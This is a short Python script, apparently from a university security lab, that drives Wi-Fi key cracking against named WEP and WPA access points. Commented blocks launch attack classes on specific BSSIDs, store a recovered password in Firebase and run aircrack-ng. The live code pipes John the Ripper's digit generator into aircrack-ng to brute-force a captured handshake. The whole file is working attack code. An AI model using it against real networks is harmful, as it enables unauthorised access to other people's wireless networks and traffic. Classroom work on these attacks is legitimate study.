import os, sys
import ap
import wep
import subprocess
import signal
import time
import wpa

if __name__ == '__main__':
	"""
	pro = subprocess.Popen(['ls','-l','datos/'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=False,preexec_fn=os.setsid)
	salida,error = pro.communicate()
	print(salida.decode('utf-8'))
	"""
	"""
	red = ap.Ap('C0:25:E9:7C:5A:E0','5','Seguridad2019-2','wep')
	ataque = wep.Wep(red)
	ataque.atacar()
	red.guardarContrasenaFirebase()
	result = subprocess.Popen(['aircrack-ng','./datos/Seguridad2019-2/Seguridad2019-2*.cap'],stdout=subprocess.PIPE,shell=False,preexec_fn=os.setsid)
	time.sleep(10)
	result.terminate()
	result.kill()
	os.killpg(os.getpgid(result.pid),signal.SIGTERM)
	salida = result.communicate()[0]
	print(salida)

	result = subprocess.Popen(['aircrack-ng ./datos/Seguridad2019-2/Seguridad2019-2*.cap'],stdout=subprocess.PIPE,shell=True)
	result.wait()
	salida, error = result.communicate()
	salida = str(salida.decode('utf-8'))
	salida = salida.split('\n')
	salida = salida[len(salida)-5]
	salida = salida.replace(" ","")
	salida = salida.replace('\x1b','')
	print(salida)
	
	red = ap.Ap('58:A2:B5:D8:BA:79','6','SeguridadWpa','wpa')
	ataque = wpa.Wpa(red)
	ataque.atacar()
"""
	#result = subprocess.Popen(['airodump-ng', '--bssid', '58:A2:B5:D8:BA:79', '--channel', '6', '-w', 'prueba', 'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=False)
	result = subprocess.Popen(['john --incremental:Digits --stdout | aircrack-ng -b C0:25:E9:7C:5A:E0 datos/Seguridad2019-2/Seguridad2019-2-01.cap -w -'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,preexec_fn=os.setsid)
	time.sleep(2)
	result.terminate()
	result.kill()
	os.killpg(os.getpgid(result.pid),signal.SIGTERM)
	sal,err = result.communicate()
	print(str(sal.decode('utf-8')))
	print(str(err.decode('utf-8')))